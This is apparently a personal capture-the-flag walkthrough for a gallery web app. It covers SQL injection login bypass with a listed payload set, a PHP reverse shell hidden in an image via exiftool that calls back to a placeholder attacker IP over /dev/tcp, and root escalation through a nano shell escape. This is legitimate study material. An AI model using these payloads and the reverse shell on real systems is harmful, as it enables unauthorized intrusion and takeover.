![Pasted image 20241007144603.png](../../IMAGES/Pasted%20image%2020241007144603.png)
# Enumeration

```ad-info
**OPEN PORTS**:
**FUZZING FOR PORT 80**:

```

The moment I went to `/gallery`, I realized it was a login page, I tried some XSS and when I sent the request, this was the output:

![Pasted image 20241007150803.png](../../IMAGES/Pasted%20image%2020241007150803.png)
Seems like this login page is vulnerable to [SQLI](../../Bug%20Bounty/Vulnerabilities/SERVER%20SIDE%20VULNERABILITIES/INJECTIONS/SQLI/SQL%20INJECTION%20(SQLI).md)
So, let's try to exploit it:

For this, I am using burp's intruder with the following payload list:

```ad-summary
'
''
`
``
,
"
""
/
//
\
\\
;
' or "
-- or # 
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
'='
'LIKE'
'=0--+
 OR 1=1
' OR 'x'='x
' AND id IS NULL; --
'''''''''''''UNION SELECT '2
%00
/*â€¦*/ 
+		
||		
%		
@variable	
@@variable	
AND 1
AND 0
AND true
AND false
1-false
1-true
1*56
-2
1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+
1' ORDER BY 1,2--+
1' ORDER BY 1,2,3--+
1' GROUP BY 1,2,--+
1' GROUP BY 1,2,3--+
' GROUP BY columnnames having 1=1 --
-1' UNION SELECT 1,2,3--+
' UNION SELECT sum(columnname ) from tablename --
-1 UNION SELECT 1 INTO @,@
-1 UNION SELECT 1 INTO @,@,@
1 AND (SELECT * FROM Users) = 1	
' AND MID(VERSION(),1,1) = '5';
' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
,(select * from (select(sleep(10)))a)
%2c(select%20*%20from%20(select(sleep(10)))a)
';WAITFOR DELAY '0:0:30'--
```

Also, as seen in the request, it must be URL encoded, so, I also put this in the payload processing:

![Pasted image 20241007152753.png](../../IMAGES/Pasted%20image%2020241007152753.png)

Let's launch the attack:
![Pasted image 20241007152809.png](../../IMAGES/Pasted%20image%2020241007152809.png)

![Pasted image 20241007152818.png](../../IMAGES/Pasted%20image%2020241007152818.png)
Seems like the attack worked for that payload, if we decode it, it is this payload:

`' OR 1 -- -`

And we got in as admin:

![Pasted image 20241007153027.png](../../IMAGES/Pasted%20image%2020241007153027.png)

If we look around, we find an image upload section:

![Pasted image 20241007153644.png](../../IMAGES/Pasted%20image%2020241007153644.png)

We can refer to our [FILE UPLOAD](../../Bug%20Bounty/Vulnerabilities/SERVER%20SIDE%20VULNERABILITIES/FILE%20INCLUSION%20VULNERABILITIES/FILE%20UPLOAD.md) note, when we try to upload a file, we can only upload images, `.jpg, .png` so, let's use `exiftool` to embed a reverse shell between an image:

```ad-note
```php-template
exiftool -Comment="<?php echo shell_exec('/bin/bash -c \'bash -i >& /dev/tcp/YOUR_IP_ADDRESS/YOUR_PORT 0>&1\''); ?>" cat.jpg -o shell.php
```

As we can see, file is an jpeg now:

![Pasted image 20241007160746.png](../../IMAGES/Pasted%20image%2020241007160746.png)

Let's try to upload it now:

![Pasted image 20241007161320.png](../../IMAGES/Pasted%20image%2020241007161320.png)
![Pasted image 20241007161325.png](../../IMAGES/Pasted%20image%2020241007161325.png)
![Pasted image 20241007161334.png](../../IMAGES/Pasted%20image%2020241007161334.png)
And we got a shell!

Let's proceed with PRIVILEGE ESCALATION:

First, let's spawn a [stable shell](../../Commands/Shell%20Tricks/STABLE%20SHELL.md), once we've done this, it's time to begin with our privilege escalation:

For the privilege escalation, I used [linpeas](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS), when I looked at linpeas output, I found this:
![Pasted image 20241007163005.png](../../IMAGES/Pasted%20image%2020241007163005.png)
seems like the password for user mike, let's su to mike:

![Pasted image 20241007163600.png](../../IMAGES/Pasted%20image%2020241007163600.png)
Now we are in as mike, let's look at mike's privileges:

![Pasted image 20241007163724.png](../../IMAGES/Pasted%20image%2020241007163724.png)
We found a rootkit.sh script, let's look at it:

![Pasted image 20241007163807.png](../../IMAGES/Pasted%20image%2020241007163807.png)
As shown in the read function of the script, it uses nano, if we go to gtfobins, this is shown:
![Pasted image 20241007164109.png](../../IMAGES/Pasted%20image%2020241007164109.png)

If we execute the script as the root user, this happens:
![Pasted image 20241007165053.png](../../IMAGES/Pasted%20image%2020241007165053.png)

Let's enter the read option:
![Pasted image 20241007164217.png](../../IMAGES/Pasted%20image%2020241007164217.png)
Next, enter `ctrl+r` and `ctrl+x`, then the following command:

`reset; sh 1>&0 2>&0`

![Pasted image 20241007165137.png](../../IMAGES/Pasted%20image%2020241007165137.png)

![Pasted image 20241007165154.png](../../IMAGES/Pasted%20image%2020241007165154.png)

And just like that, we got root access!

